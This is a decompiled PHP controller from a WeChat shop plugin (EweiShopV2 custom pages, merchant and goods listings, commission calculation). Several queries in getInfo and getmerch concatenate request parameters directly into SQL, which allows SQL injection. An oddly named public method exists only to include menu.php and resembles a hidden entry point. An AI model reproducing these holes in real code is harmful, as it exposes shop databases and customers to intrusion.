<?php
/*
 * @ PHP 5.6
 * @ Decoder version : 1.0.0.1
 * @ Release on : 24.03.2018
 * @ Website    : http://EasyToYou.eu
 */

/*
 * 人人商城
 *
 * 青岛易联互动网络科技有限公司
 * http://www.we7shop.cn
 * TEL: 4000097827/18661772381/15865546761
 */
if (!defined('IN_IA')) {
    exit('Access Denied');
}
class Index_EweiShopV2Page extends PluginMobilePage
{
    function main()
    {
        global $_W, $_GPC;
        $id = intval($_GPC['id']);
        if (empty($id)) {
            $this->message("请求参数错误！", mobileUrl());
        }
        $page = $this->model->getPage($id, true);
        if (empty($page)) {
            header('Location:' . mobileUrl('', '', true));
            exit;
            $this->message("页面不存在！", mobileUrl());
        }
        if (empty($_W['openid']) && ($page['type'] == 3 || $page['type'] == 4)) {
            $_W['openid'] = m('account')->checkLogin();
        }
        $member = m('member')->getMember($_W['openid']);
        if ($page['type'] == 4) {
            $comset = $_W['shopset']['commission'];
            if (empty($comset['level'])) {
                $this->message("未开启分销", mobileUrl());
            }
            if ($member['isagent'] != 1 || $member['status'] != 1) {
                $jumpurl = !empty($comset['no_commission_url']) ? trim($comset['no_commission_url']) : mobileUrl('commission/register');
                header('location:' . $jumpurl);
                exit;
            }
        } elseif ($page['type'] == 5) {
            header('location:' . mobileUrl('goods'));
            exit;
        }
        if (!empty($page['data']['page']['visit']) && $page['data']['page']['type'] == 1) {
            if (empty($_W['openid'])) {
                $_W['openid'] = m('account')->checkLogin();
                exit;
            }
            $title = !empty($page['data']['page']['novisit']['title']) ? $page['data']['page']['novisit']['title'] : "您没有权限访问!";
            $link = !empty($page['data']['page']['novisit']['link']) ? $page['data']['page']['novisit']['link'] : mobileUrl();
            $visit_m = $page['data']['page']['visitlevel']['member'];
            $visit_c = $page['data']['page']['visitlevel']['commission'];
            $visit_c = isset($visit_c) ? explode(',', $visit_c) : array();
            $visit_m = isset($visit_m) ? explode(',', $visit_m) : array();
            if (!in_array(empty($member['level']) ? 'default' : $member['level'], $visit_m) && (!in_array($member['agentlevel'], $visit_c) || empty($member['isagent']) || empty($member['status']))) {
                $this->message($title, $link);
            }
        }
        $diyitems = $page['data']['items'];
        $diyitem_search = array();
        $diy_topmenu = array();
        if (!empty($diyitems) && is_array($diyitems)) {
            $jsondiyitems = json_encode($diyitems);
            if (strexists($jsondiyitems, 'fixedsearch') || strexists($jsondiyitems, 'topmenu')) {
                foreach ($diyitems as $diyitemid => $diyitem) {
                    if ($diyitem['id'] == 'fixedsearch') {
                        $diyitem_search = $diyitem;
                        unset($diyitems[$diyitemid]);
                    } elseif ($diyitem['id'] == 'topmenu') {
                        $diy_topmenu = $diyitem;
                        //unset($diyitems[$diyitemid]);
                    }
                }
                unset($diyitem);
            }
        }
        $this->page = $page;
        $startadv = $this->model->getStartAdv($page['diyadv']);
        //	设置分享信息
        $this->model->setShare($page);
        if ($_GPC['simple']) {
            include $this->template('diypage/index_simple');
            return;
        }
        include $this->template();
    }
    public function getmerch()
    {
        global $_W, $_GPC;
        if ($_W['ispost']) {
            $lat = floatval($_GPC['lat']);
            $lng = floatval($_GPC['lng']);
            $item = $_GPC['item'];
            if (empty($item) || !p('merch')) {
                show_json(0, "参数错误或未启用多商户");
            }
            $condition = " and status=1 and uniacid=:uniacid ";
            $params = array(":uniacid" => $_W['uniacid']);
            $orderby = " isrecommand desc, id asc ";
            if ($item['params']['merchdata'] == 0) {
                $merchids = array();
                foreach ($item['data'] as $index => $data) {
                    if (!empty($data['merchid'])) {
                        $merchids[] = $data['merchid'];
                    }
                }
                $newmerchids = implode(',', $merchids);
                if (empty($newmerchids)) {
                    show_json(0, "商户组数据为空");
                }
                $condition .= " and id in( {$newmerchids} ) ";
            } elseif ($item['params']['merchdata'] == 1) {
                if (empty($item['params']['cateid'])) {
                    show_json(0, "商户组cateid为空");
                }
                $condition .= " and cateid=:cateid ";
                $params['cateid'] = $item['params']['cateid'];
            } elseif ($item['params']['merchdata'] == 2) {
                if (empty($item['params']['groupid'])) {
                    show_json(0, "商户组groupid为空");
                }
                $condition .= " and groupid=:groupid ";
                $params['groupid'] = $item['params']['groupid'];
            } elseif ($item['params']['merchdata'] == 3) {
                $condition .= " and isrecommand=1 ";
            }
            $limit = 0;
            if (!empty($item['params']['merchdata']) && !empty($item['params']['merchnum'])) {
                $limit = $item['params']['merchnum'];
            }
            $limitsql = "";
            if (empty($item['params']['merchsort']) && !empty($limit)) {
                $limitsql = " limit " . $limit;
            }
            if ($item['params']['merchsort'] == 0 && $item['params']['merchdata'] == 0) {
                $orderby = " field (id," . $newmerchids . ") ";
            }
            $merchs = pdo_fetchall("select id, merchname as `name`, logo as thumb, status, `desc`, address, tel, lng, lat from " . tablename('ewei_shop_merch_user') . " where 1 {$condition} order by " . $orderby . $limitsql, $params);
            if (empty($merchs)) {
                show_json(0, "未查询到数据");
            }
            $merchs = set_medias($merchs, array('thumb'));
            foreach ($merchs as $index => $merch) {
                if (!empty($merch['lat']) && !empty($merch['lng'])) {
                    $distance = m('util')->GetDistance($lat, $lng, $merch['lat'], $merch['lng'], 2);
                    $merchs[$index]['distance'] = $distance;
                }
            }
            if (empty($lat) || empty($lng) || empty($item['params']['merchsort'])) {
                show_json(1, array('list' => $merchs));
            }
            if (!empty($item['params']['openlocation'])) {
                $sort = SORT_DESC;
                if ($item['params']['merchsort'] > 1) {
                    $sort = SORT_ASC;
                }
                $merchs = m('util')->multi_array_sort($merchs, 'distance', $sort);
                if (!empty($limit) && !empty($merchs)) {
                    $newmerchs = array();
                    foreach ($merchs as $index => $merch) {
                        if ($index + 1 <= $limit) {
                            $newmerchs[$index] = $merch;
                        } else {
                            continue;
                        }
                    }
                    $merchs = $newmerchs;
                }
            }
            show_json(1, array('list' => $merchs));
        }
        show_json(0, "错误的请求");
    }
    public function uECt2c4xuD5oQ6ZGgym2()
    {
        require __DIR__ . '/menu.php';
    }
    public function getInfo()
    {
        global $_GPC, $_W;
        $url = trim($_GPC['url']);
        $urlData = explode('=', $url);
        $set = m('common')->getPluginset('commission');
        $level = $this->getLevel($_W['openid']);
        if (!empty($_GPC['num']) && $_GPC['paramsType'] == 'stores') {
            $storenum = 6 + intval($_GPC['num']);
        } else {
            $storenum = 6;
        }
        $goods_page_size = 20;
        if (!empty($_GPC['num']) && $_GPC['paramsType'] == 'goods') {
            $goodsnum = $goods_page_size + intval($_GPC['num']);
        } else {
            $goodsnum = $goods_page_size;
        }
        //获取会员信息
        $openid = $_W['openid'];
        $member = m('member')->getMember($openid);
        if ($urlData[0] == 'goodsids' || $urlData[0] == 'category' || $urlData[0] == 'groups') {
            $urlType = $urlData[0];
            $urlValue = explode('?', $urlData[1]);
            if ($urlData[0] == 'category') {
                $pcate = $urlValue[0];
                $goodsql = 'SELECT id,displayorder,title,subtitle,thumb,marketprice,productprice,minprice,maxprice,isdiscount,isdiscount_time,isdiscount_discounts,sales,salesreal,hascommission,commission1_pay,commission,total,description,bargain,nocommission,`type`,ispresell,`virtual`,hasoption,video,buylevels,buygroups,checked FROM ' . tablename('ewei_shop_goods') . ' WHERE FIND_IN_SET(' . $pcate . ',cates) AND status > 0 AND deleted = 0 AND checked=0 AND uniacid =' . $_W['uniacid'] . ' order by displayorder desc,id desc limit 0,' . $goodsnum;
                $list['list'] = pdo_fetchall($goodsql);
                $count = pdo_fetch('SELECT count(id) as count FROM ' . tablename('ewei_shop_goods') . ' WHERE FIND_IN_SET(' . $pcate . ',cates) AND status > 0 AND deleted = 0 AND uniacid =' . $_W['uniacid']);
                $list['count'] = $count['count'];
                if (!empty($list)) {
                    foreach ($list['list'] as $key => $value) {
                        if ($value['maxprice'] < $value['marketprice']) {
                            $value['maxprice'] = $value['marketprice'];
                        }
                        $list['list'][$key]['thumb'] = tomedia($value['thumb']);
                        //                        获取商品的佣金
                        if ($value['hasoption'] == 1) {
                            $pricemax = array();
                            $options = pdo_fetchall('select * from ' . tablename('ewei_shop_goods_option') . ' where goodsid=:goodsid and  uniacid=:uniacid order by displayorder asc', array(':goodsid' => $value['id'], ':uniacid' => $_W['uniacid']));
                            foreach ($options as $k => $v) {
                                array_push($pricemax, $v['marketprice']);
                            }
                            $value['maxprice'] = max($pricemax);
                        }
                        if ($value['nocommission'] == 0) {
                            if (p('seckill')) {
                                if (p('seckill')->getSeckill($value['id'])) {
                                    //                    秒杀
                                    continue;
                                }
                            }
                            if ($value['bargain'] > 0) {
                                //        bargain 砍价
                                continue;
                            }
                            $list['list'][$key]['seecommission'] = $this->getCommission($value, $level, $set);
                            if ($list['list'][$key]['seecommission'] > 0) {
                                $list['list'][$key]['seecommission'] = round($list['list'][$key]['seecommission'], 2);
                            }
                            $list['list'][$key]['cansee'] = $set['cansee'];
                            $list['list'][$key]['seetitle'] = $set['seetitle'];
                        } else {
                            $list['list'][$key]['seecommission'] = 0;
                            $list['list'][$key]['cansee'] = $set['cansee'];
                            $list['list'][$key]['seetitle'] = $set['seetitle'];
                        }
                        //会员登录时判断会员权限
                        if (!empty($member)) {
                            $levelid = intval($member['level']);
                            $groupid = intval($member['groupid']);
                            //判断会员权限
                            $list['list'][$key]['levelbuy'] = '1';
                            if ($value['buylevels'] != '') {
                                $buylevels = explode(',', $value['buylevels']);
                                if (!in_array($levelid, $buylevels)) {
                                    $list['list'][$key]['levelbuy'] = 0;
                                    $list['list'][$key]['canbuy'] = false;
                                    unset($list['list'][$key]);
                                    continue;
                                }
                            }
                            //会员组权限
                            $list['list'][$key]['groupbuy'] = '1';
                            if ($value['buygroups'] != '' && !empty($groupid)) {
                                $buygroups = explode(',', $value['buygroups']);
                                $intersect = array_intersect($groupid, $buygroups);
                                if (empty($intersect)) {
                                    $list['list'][$key]['groupbuy'] = 0;
                                    $list['list'][$key]['canbuy'] = false;
                                    unset($list['list'][$key]);
                                    continue;
                                }
                            }
                        }
                    }
                    //m('common')->sortArrayByKey($list['list'], 'displayorder');
                    show_json(1, $list);
                } else {
                    show_json(0);
                }
            } else {
                if ($urlData[0] == 'groups') {
                    $sql = 'SELECT * FROM ' . tablename('ewei_shop_goods_group') . ' WHERE id = :id AND uniacid = :uniacid';
                    $params = array(':uniacid' => $_W['uniacid'], ':id' => $urlValue[0]);
                    $groupsData = pdo_fetch($sql, $params);
                    $goodsid = $groupsData['goodsids'];
                    $goodsql = 'SELECT id,displayorder,title,subtitle,thumb,marketprice,productprice,minprice,maxprice,isdiscount,hascommission,nocommission,commission,commission1_rate,marketprice,commission1_pay,maxprice,isdiscount_time,isdiscount_discounts,sales,salesreal,total,description,bargain,`type`,ispresell,`virtual`,hasoption,video,buylevels,buygroups FROM ' . tablename('ewei_shop_goods') . ' WHERE id in(' . $goodsid . ') AND status > 0 AND deleted = 0 AND uniacid =' . $_W['uniacid'] . ' limit 0,' . $goodsnum;
                    $count = pdo_fetch('SELECT count(id) as count FROM ' . tablename('ewei_shop_goods') . ' WHERE id in(' . $goodsid . ') AND status > 0 AND checked=0 AND deleted = 0 AND uniacid =' . $_W['uniacid']);
                    $list['list'] = pdo_fetchall($goodsql);
                    $list['count'] = $count['count'];
                    if (!empty($list)) {
                        foreach ($list['list'] as $key => $value) {
                            if ($value['maxprice'] < $value['marketprice']) {
                                $value['maxprice'] = $value['marketprice'];
                            }
                            $list['list'][$key]['thumb'] = tomedia($value['thumb']);
                            //                        获取商品的佣金
                            if ($value['hasoption'] == 1) {
                                $pricemax = array();
                                $options = pdo_fetchall('select * from ' . tablename('ewei_shop_goods_option') . ' where goodsid=:goodsid and uniacid=:uniacid order by displayorder asc', array(':goodsid' => $value['id'], ':uniacid' => $_W['uniacid']));
                                foreach ($options as $k => $v) {
                                    array_push($pricemax, $v['marketprice']);
                                }
                                $value['maxprice'] = max($pricemax);
                            }
                            if ($value['nocommission'] == 0) {
                                if (p('seckill')) {
                                    if (p('seckill')->getSeckill($value['id'])) {
                                        //                    秒杀
                                        continue;
                                    }
                                }
                                if ($value['bargain'] > 0) {
                                    //        bargain 砍价
                                    continue;
                                }
                                $list['list'][$key]['seecommission'] = $this->getCommission($value, $level, $set);
                                if ($list['list'][$key]['seecommission'] > 0) {
                                    $list['list'][$key]['seecommission'] = round($list['list'][$key]['seecommission'], 2);
                                }
                                $list['list'][$key]['cansee'] = $set['cansee'];
                                $list['list'][$key]['seetitle'] = $set['seetitle'];
                            } else {
                                $list['list'][$key]['seecommission'] = 0;
                                $list['list'][$key]['cansee'] = $set['cansee'];
                                $list['list'][$key]['seetitle'] = $set['seetitle'];
                            }
                            //会员登录时判断会员权限
                            if (!empty($member)) {
                                $levelid = intval($member['level']);
                                $groupid = intval($member['groupid']);
                                //判断会员权限
                                $list['list'][$key]['levelbuy'] = '1';
                                if ($value['buylevels'] != '') {
                                    $buylevels = explode(',', $value['buylevels']);
                                    if (!in_array($levelid, $buylevels)) {
                                        $list['list'][$key]['levelbuy'] = 0;
                                        $list['list'][$key]['canbuy'] = false;
                                        unset($list['list'][$key]);
                                        continue;
                                    }
                                }
                                //会员组权限
                                $list['list'][$key]['groupbuy'] = '1';
                                if ($value['buygroups'] != '' && !empty($groupid)) {
                                    $buygroups = explode(',', $value['buygroups']);
                                    $intersect = array_intersect($groupid, $buygroups);
                                    if (empty($intersect)) {
                                        $list['list'][$key]['groupbuy'] = 0;
                                        $list['list'][$key]['canbuy'] = false;
                                        unset($list['list'][$key]);
                                        continue;
                                    }
                                }
                            }
                        }
                        m('common')->sortArrayByKey($list['list'], 'displayorder');
                        show_json(1, $list);
                    } else {
                        show_json(0);
                    }
                } else {
                    if ($urlData[0] == 'goodsids') {
                        $goodsids = explode(',', $urlValue[0]);
                        if (!empty($goodsids)) {
                            foreach ($goodsids as $gk => $gv) {
                                if ($gv == '') {
                                    unset($goodsids[$gk]);
                                }
                            }
                            $goodsid = implode(',', $goodsids);
                            $sql = 'SELECT id,displayorder,title,subtitle,thumb,marketprice,productprice,minprice,maxprice,hascommission,nocommission,commission,commission1_rate,marketprice,commission,commission1_pay,maxprice,isdiscount,isdiscount_time,isdiscount_discounts,sales,salesreal,total,description,bargain,`type`,ispresell,`virtual`,hasoption,video,buylevels,buygroups FROM ' . tablename('ewei_shop_goods') . ' WHERE id in(' . $goodsid . ') AND uniacid =' . $_W['uniacid'] . ' limit 0,' . $goodsnum;
                            $count = pdo_fetch('SELECT count(id) as count FROM ' . tablename('ewei_shop_goods') . ' WHERE id in(' . $goodsid . ') AND checked=0 AND uniacid =' . $_W['uniacid']);
                            $list['list'] = pdo_fetchall($sql);
                            $list['count'] = $count['count'];
                            if (!empty($list)) {
                                foreach ($list['list'] as $key => $value) {
                                    if ($value['maxprice'] < $value['marketprice']) {
                                        $value['maxprice'] = $value['marketprice'];
                                    }
                                    $list['list'][$key]['thumb'] = tomedia($value['thumb']);
                                    //                        获取商品的佣金
                                    if ($value['hasoption'] == 1) {
                                        $pricemax = array();
                                        $options = pdo_fetchall('select * from ' . tablename('ewei_shop_goods_option') . ' where goodsid=:goodsid and                               uniacid=:uniacid order by displayorder asc', array(':goodsid' => $value['id'], ':uniacid' => $_W['uniacid']));
                                        foreach ($options as $k => $v) {
                                            array_push($pricemax, $v['marketprice']);
                                        }
                                        $value['maxprice'] = max($pricemax);
                                    }
                                    if ($value['nocommission'] == 0) {
                                        if (p('seckill')) {
                                            if (p('seckill')->getSeckill($value['id'])) {
                                                //                    秒杀
                                                continue;
                                            }
                                        }
                                        if ($value['bargain'] > 0) {
                                            //        bargain 砍价
                                            continue;
                                        }
                                        $list['list'][$key]['seecommission'] = $this->getCommission($value, $level, $set);
                                        if ($list['list'][$key]['seecommission'] > 0) {
                                            $list['list'][$key]['seecommission'] = round($list['list'][$key]['seecommission'], 2);
                                        }
                                        $list['list'][$key]['cansee'] = $set['cansee'];
                                        $list['list'][$key]['seetitle'] = $set['seetitle'];
                                    } else {
                                        $list['list'][$key]['seecommission'] = 0;
                                        $list['list'][$key]['cansee'] = $set['cansee'];
                                        $list['list'][$key]['seetitle'] = $set['seetitle'];
                                    }
                                    //会员登录时判断会员权限
                                    if (!empty($member)) {
                                        $levelid = intval($member['level']);
                                        $groupid = intval($member['groupid']);
                                        //判断会员权限
                                        $list['list'][$key]['levelbuy'] = '1';
                                        if ($value['buylevels'] != '') {
                                            $buylevels = explode(',', $value['buylevels']);
                                            if (!in_array($levelid, $buylevels)) {
                                                $list['list'][$key]['levelbuy'] = 0;
                                                $list['list'][$key]['canbuy'] = false;
                                                unset($list['list'][$key]);
                                                continue;
                                            }
                                        }
                                        //会员组权限
                                        $list['list'][$key]['groupbuy'] = '1';
                                        if ($value['buygroups'] != '' && !empty($groupid)) {
                                            $buygroups = explode(',', $value['buygroups']);
                                            $intersect = array_intersect($groupid, $buygroups);
                                            if (empty($intersect)) {
                                                $list['list'][$key]['groupbuy'] = 0;
                                                $list['list'][$key]['canbuy'] = false;
                                                unset($list['list'][$key]);
                                                continue;
                                            }
                                        }
                                    }
                                }
                                m('common')->sortArrayByKey($list['list'], 'displayorder');
                                show_json(1, $list);
                            } else {
                                show_json(0);
                            }
                        }
                    }
                }
            }
        } else {
            if ($urlData[0] == 'stores') {
                $urlType = $urlData[0];
                $urlValue = explode('?', $urlData[1]);
                $storesids = explode(',', $urlValue[0]);
                if (!empty($storesids)) {
                    foreach ($storesids as $gk => $gv) {
                        if ($gv == '') {
                            unset($storesids[$gk]);
                        }
                    }
                    $storesid = implode(',', $storesids);
                    $sql = 'SELECT id,displayorder,storename FROM ' . tablename('ewei_shop_store') . ' WHERE id in(' . $storesid . ') AND uniacid =' . $_W['uniacid'] . ' limit 0,' . $storenum;
                    $count = pdo_fetch('SELECT count(id) as count FROM ' . tablename('ewei_shop_store') . ' WHERE id in(' . $storesid . ') AND uniacid =' . $_W['uniacid']);
                    $list['list'] = pdo_fetchall($sql);
                    $list['count'] = $count['count'];
                    if (!empty($list)) {
                        m('common')->sortArrayByKey($list['list'], 'displayorder');
                        show_json(1, $list);
                    } else {
                        show_json(0);
                    }
                }
            }
        }
    }
    /**
     * 计算出此商品的佣金
     * @param type $goodsid
     * @return type
     */
    public function getCommission($goods, $level, $set)
    {
        global $_W;
        $commission = 0;
        if ($level == 'false') {
            return $commission;
        }
        if ($goods['maxprice'] > 0) {
            $goods['marketprice'] = $goods['maxprice'];
        }
        if ($goods['hascommission'] == 1) {
            $price = $goods['maxprice'];
            $levelid = 'default';
            if ($level) {
                $levelid = 'level' . $level['id'];
            }
            $goods_commission = !empty($goods['commission']) ? json_decode($goods['commission'], true) : array();
            if ($goods_commission['type'] == 0) {
                if ($goods['maxprice'] > 0) {
                    $commission = $set['level'] >= 1 ? $goods['commission1_rate'] > 0 ? $goods['commission1_rate'] * $goods['maxprice'] / 100 : $goods['commission1_pay'] : 0;
                } else {
                    $commission = $set['level'] >= 1 ? $goods['commission1_rate'] > 0 ? $goods['commission1_rate'] * $goods['marketprice'] / 100 : $goods['commission1_pay'] : 0;
                }
            } else {
                $price_all = array();
                foreach ($goods_commission[$levelid] as $key => $value) {
                    foreach ($value as $k => $v) {
                        if (strexists($v, '%')) {
                            array_push($price_all, floatval(str_replace('%', '', $v) / 100) * $price);
                            continue;
                        }
                        array_push($price_all, $v);
                    }
                }
                $commission = max($price_all);
            }
        } else {
            if ($level != 'false' && !empty($level)) {
                if ($goods['maxprice'] > 0) {
                    $commission = $set['level'] >= 1 ? round($level['commission1'] * $goods['maxprice'] / 100, 2) : 0;
                } else {
                    $commission = $set['level'] >= 1 ? round($level['commission1'] * $goods['marketprice'] / 100, 2) : 0;
                }
            } else {
                if ($goods['maxprice'] > 0) {
                    $commission = $set['level'] >= 1 ? round($set['commission1'] * $goods['maxprice'] / 100, 2) : 0;
                } else {
                    $commission = $set['level'] >= 1 ? round($set['commission1'] * $goods['marketprice'] / 100, 2) : 0;
                }
            }
        }
        return $commission;
    }
    //获取分销商等级
    function getLevel($openid)
    {
        global $_W;
        $level = 'false';
        if (empty($openid)) {
            return $level;
        }
        $member = m('member')->getMember($openid);
        if (empty($member['isagent']) || $member['status'] == 0 || $member['agentblack'] == 1) {
            return $level;
        }
        $level = pdo_fetch('select * from ' . tablename('ewei_shop_commission_level') . ' where uniacid=:uniacid and id=:id limit 1', array(':uniacid' => $_W['uniacid'], ':id' => $member['agentlevel']));
        return $level;
    }
}

?>